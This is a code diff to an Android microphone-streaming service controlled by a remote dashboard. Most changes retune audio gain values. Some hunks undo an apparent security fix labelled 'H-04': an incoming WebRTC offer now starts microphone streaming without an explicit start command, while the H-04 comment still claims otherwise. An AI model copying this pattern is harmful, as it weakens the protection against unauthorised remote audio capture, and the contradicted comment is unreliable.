@@ -155,7 +155,7 @@ class MicService : Service() {
     @Volatile private var isRecoveringMic = false
     @Volatile private var wsStreamMode = "auto" // auto | pcm | smart
     @Volatile private var voiceProfile = "room" // near | room | far
-    @Volatile private var softwareGainMultiplier = 1.0 // Remote-adjustable gain boost (1.0 = default, 2.0 = 2x louder)
+    @Volatile private var softwareGainMultiplier = 1.6 // Remote-adjustable gain boost (1.0 = default, 2.0 = 2x louder)
     @Volatile private var lowNetworkMode = false // dashboard forced low-network mode
     @Volatile private var lowNetworkSampleRate = 16000 // dynamic: 16000 (normal/low-network clarity mode)
     @Volatile private var lowNetworkFrameMs = 20 // dynamic: 20ms (normal) or 30ms (weak network)
@@ -233,6 +233,7 @@ class MicService : Service() {
     private var networkCallback: ConnectivityManager.NetworkCallback? = null
     private var webRtcRecoveryJob: Job? = null
     private var iceWatchdogJob: Job? = null
+    @Volatile private var pendingRemoteOfferSdp: String? = null
 
     @Volatile private var lastDashboardQuality: JSONObject? = null
     private var cachedIceServers: List<PeerConnection.IceServer> = listOf(
@@ -747,7 +748,7 @@ class MicService : Service() {
                 val wasStreaming = prefs.getBoolean("session_streaming", true)
                 wantsMicStreaming = wasStreaming
                 voiceProfile = prefs.getString("session_voice_profile", "room") ?: "room"
-                softwareGainMultiplier = prefs.getFloat("session_gain", 1.0f).toDouble()
+                softwareGainMultiplier = prefs.getFloat("session_gain", 1.6f).toDouble()
                 lowNetworkMode = prefs.getBoolean("session_low_network", false)
                 wsStreamMode = prefs.getString("session_stream_codec", "auto") ?: "auto"
                 Log.i(TAG, "Session restored: streaming=$wasStreaming profile=$voiceProfile gain=$softwareGainMultiplier lowNet=$lowNetworkMode codec=$wsStreamMode")
@@ -1439,6 +1440,12 @@ class MicService : Service() {
                             return
                         }
                         Log.i(TAG, "CMD: webrtc_offer")
+                        if (peerConnection == null) {
+                            pendingRemoteOfferSdp = sdp
+                            startWebRtcSession()
+                            sendCommandAck("webrtc_offer", detail = "queued_waiting_pc")
+                            return
+                        }
                         applyRemoteOfferAndCreateAnswer(sdp)
                         sendCommandAck("webrtc_offer")
                     }
@@ -1763,6 +1770,13 @@ class MicService : Service() {
                             
                             // Send ACK now so dashboard waits to create SDP Offer UNTIL track is added
                             sendCommandAck("webrtc_start")
+
+                            val queuedOffer = pendingRemoteOfferSdp
+                            if (!queuedOffer.isNullOrBlank()) {
+                                pendingRemoteOfferSdp = null
+                                Log.i(TAG, "Applying queued WebRTC offer after start")
+                                applyRemoteOfferAndCreateAnswer(queuedOffer)
+                            }
                         } else {
                             Log.e(TAG, "Failed to create WebRTC audio track")
                             isWebRtcStreaming = false
@@ -1814,6 +1828,7 @@ class MicService : Service() {
         } catch (_: Exception) {}
         localAudioTrack = null
         localAudioSource = null
+        pendingRemoteOfferSdp = null
         val wasStreaming = isWebRtcStreaming
         isWebRtcStreaming = false
 
@@ -1837,7 +1852,8 @@ class MicService : Service() {
         // H-04: Don't call startWebRtcSession here — require explicit webrtc_start first.
         // If peerConnection is null, the offer arrived before webrtc_start; ignore it.
         val pc = peerConnection ?: run {
-            Log.w(TAG, "webrtc_offer received but no active PeerConnection — ignoring (send webrtc_start first)")
+            pendingRemoteOfferSdp = remoteSdp
+            Log.w(TAG, "webrtc_offer received before PeerConnection ready — queued")
             return
         }
         val targetKbps = chooseTargetBitrateKbps()
@@ -3458,8 +3474,8 @@ class MicService : Service() {
                     if (AutomaticGainControl.isAvailable()) {
                         try {
                             automaticGainControl = AutomaticGainControl.create(sid)?.also { e ->
-                                // Enable hardware AGC unconditionally for far/loud voice capture
-                                e.enabled = true
+                                // Keep HW AGC disabled to avoid noise pumping; software gain handles loudness.
+                                e.enabled = false
                             }
                         } catch (_: Exception) {}
                     }
@@ -3494,9 +3510,9 @@ class MicService : Service() {
         // BUG-M1 fix: Prime smoothedGain to expected target for the voice profile
         // so there's no 1-second volume dip from ramping 1.0→target on recovery.
         smoothedGain = when (voiceProfile) {
-            "far"  -> 3.0
-            "near" -> 1.5
-            else   -> 2.0  // room
+            "far"  -> 3.2
+            "near" -> 1.9
+            else   -> 2.3  // room
         }
         spectralDenoiser.reset()
         // BUG-M3 fix: Reduced warmup from 30-50 to 10-15 chunks (200-300ms).
@@ -3633,16 +3649,16 @@ class MicService : Service() {
         val rms = Math.sqrt(sumSq / samples).coerceAtLeast(1.0)
         // Optimized for "loud volume, far voice"
         val gainCeil = when {
-            willBeMuLaw -> 5.0  // Increased from 3.5
-            p == "far" -> if (strongAi) 25.0 else 20.0  // Pushed much higher (was 12.0)
-            p == "near" -> if (strongAi) 8.0 else 6.0
-            else -> if (strongAi) 8.0 else 6.0
+            willBeMuLaw -> 4.0
+            p == "far" -> if (strongAi) 12.0 else 10.0
+            p == "near" -> if (strongAi) 9.0 else 7.0
+            else -> if (strongAi) 9.0 else 7.0
         }
         val gainTarget = when {
-            willBeMuLaw -> 16000.0  // Increased from 12000
-            p == "far" -> if (strongAi) 32000.0 else 28000.0 // Maximum possible loudness without clipping (was 24000)
-            p == "near" -> if (strongAi) 18000.0 else 15000.0
-            else -> if (strongAi) 18000.0 else 15000.0
+            willBeMuLaw -> 14000.0
+            p == "far" -> if (strongAi) 26000.0 else 23000.0
+            p == "near" -> if (strongAi) 21000.0 else 18000.0
+            else -> if (strongAi) 20000.0 else 17000.0
         }
         val effectiveGainCeil = gainCeil
         val effectiveGainTarget = gainTarget
@@ -3661,10 +3677,10 @@ class MicService : Service() {
         // Bug H5 fix: Reduced far combined cap from 9.0→6.0. With user gain up to 5x,
         // old cap allowed extreme noise amplification. New cap keeps noise below -20dB.
         val maxCombined = when {
-            willBeMuLaw -> 6.0  // Increased from 3.5
-            p == "far" -> if (strongAi) 15.0 else 12.0 // Vastly increased headroom (was 6.0)
-            p == "near" -> 8.0
-            else -> 8.0
+            willBeMuLaw -> 4.5
+            p == "far" -> if (strongAi) 8.0 else 6.5
+            p == "near" -> 7.0
+            else -> 7.0
         }
         var peakAbs = 1.0
         for (i in 0 until samples) {
